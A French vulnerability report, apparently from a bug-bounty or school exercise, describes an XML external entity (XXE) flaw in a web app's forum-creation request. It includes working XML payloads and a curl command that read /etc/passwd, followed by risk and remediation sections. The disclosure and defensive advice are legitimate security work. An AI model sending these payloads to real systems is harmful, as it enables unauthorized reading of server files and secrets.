# Description  
La vulnérabilité identifiée est une injection d’entité externe XML (XXE) au sein du module de création de forums d’association.
Après avoir créé une association, l’utilisateur a la possibilité d’accéder à un espace dédié où il peut créer des forums liés à son association. Lors de l’envoi d’un formulaire de création de forum, la requête utilise un format XML pour transmettre les données.
Cependant, l'analyse XML sur le serveur ne désactive pas correctement la résolution des entités externes, permettant ainsi à un attaquant de forger une requête XML malveillante pour accéder à des fichiers locaux du serveur.

# Exploitation  
Pour exploiter cette vulnérabilité, l'utilisateur commence par créer une nouvelle association via le lien prévu à cet effet (https://<IP>/index.php?page=association/create_association.php).
Après avoir créé l’association, il accède à la liste des associations dont il est administrateur (https://<IP>/index.php?page=association/my_associations.php). 
![YWH R563414 image](YWH-R563414-image.png)
En cliquant sur l’association nouvellement créée, il arrive sur la page publique de son profil d’association (https://<IP>/index.php?page=association/public_profile.php&uuid=f0bff852-e4c8-44bf-aba6-f79491385479), où il peut cliquer sur « View Forum List » pour accéder à la gestion des forums (https://<IP>/index.php?page=volunteer/list_forum.php&uuid=f0bff852-e4c8-44bf-aba6-f79491385479).
![YWH R563417 image](YWH-R563417-image.png)
Lors de la création d’un nouveau forum, une requête POST contenant un formulaire XML est envoyée. En interceptant cette requête via un proxy (comme Burp Suite), il est possible de modifier manuellement le contenu du XML pour y insérer une entité externe.
Un payload XXE classique est alors injecté, visant à lire par exemple le fichier sensible /etc/passwd.
Après l’envoi de la requête modifiée, le serveur traite le XML, interprète l'entité externe, et injecte son contenu dans le champ description du forum. En revenant sur la liste des forums, on peut observer que le champ description affiche le contenu du fichier /etc/passwd, confirmant ainsi la vulnérabilité.

# PoC  
Après avoir créé une association et un forum normalement, la requête POST de création de forum est interceptée.
Son contenu XML standard :

```<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE forum [
  <!ELEMENT forum ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<forum>
  <association_uuid>f0bff852-e4c8-44bf-aba6-f79491385479</association_uuid>
  <title>&xxe;</title>
  <description>Simple test</description>
</forum>```

est remplacé par le payload suivant :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE forum [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<forum>
  <association_uuid>f0bff852-e4c8-44bf-aba6-f79491385479</association_uuid>
  <title>forumTitle</title>
  <description>&xxe;</description>
  <csrf_token>ce966eb42ced0ef3b4e63332de782b0eabab39766c1f6c8c427a6155f70fc079</csrf_token>
</forum>```

![YWH R563420 image](YWH-R563420-image.png)
Après l'envoi de cette requête, en consultant la liste des forums, on constate que la description du forum contient le contenu du fichier /etc/passwd, démontrant que le serveur a traité et inclus une entité externe.
![YWH R563411 image](YWH-R563411-image.png)

Voici la requête curl pouvant être utilisé pour simuler l'attaque : 
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: <IP>' -H $'Content-Length: 307' -H $'Sec-Ch-Ua: \"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\"' -H $'Sec-Ch-Ua-Platform: \"Linux\"' -H $'Accept-Language: fr-FR' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36' -H $'Content-Type: application/xml' -H $'Accept: */*' -H $'Origin: https://<IP>' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://<IP>/index.php?page=volunteer%2Fcreate_forum.php&uuid=f0bff852-e4c8-44bf-aba6-f79491385479&csrf_token=ce966eb42ced0ef3b4e63332de782b0eabab39766c1f6c8c427a6155f70fc079' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=1, i' \
    -b $'PHPSESSID=b40e027b535732ff7e99084096bdc28b' \
    --data-binary $'\x0a<?xml version=\"1.0\" encoding=\"UTF-8\"?>\x0d\x0a<!DOCTYPE forum [\x0d\x0a  <!ELEMENT forum ANY >\x0d\x0a  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\x0d\x0a]>\x0d\x0a<forum>\x0d\x0a  <association_uuid>f0bff852-e4c8-44bf-aba6-f79491385479</association_uuid>\x0d\x0a  <title>&xxe;</title>\x0d\x0a  <description>Simple test</description>\x0d\x0a</forum>\x0a            ' \
    $'https://<IP>/index.php?page=volunteer/create_forum.php'

# Risk
La vulnérabilité XXE permet à un attaquant d'accéder à des fichiers sensibles du serveur.
Selon la configuration du serveur, un XXE peut également permettre :

- Le vol de fichiers internes (configuration, bases de données, secrets d'application),
- Le déclenchement de requêtes SSRF (Server-Side Request Forgery),
- Dans certains cas, une exécution de code à distance si des interactions avancées sont possibles.

Dans ce contexte, la fuite du fichier /etc/passwd constitue une exposition importante des informations système.

# Remediation  
Il est recommandé de :

- Désactiver la résolution des entités externes dans tous les parsers XML utilisés sur le serveur.
- Utiliser des parsers XML sécurisés en désactivant explicitement la prise en charge des DTD (Document Type Definition).
- Valider et nettoyer toutes les entrées XML utilisateurs avant traitement.
- Préférer, lorsque c'est possible, des formats de sérialisation plus sûrs comme JSON au lieu de XML pour les échanges de données utilisateur.
# Author
Mindbreakers_ESGI
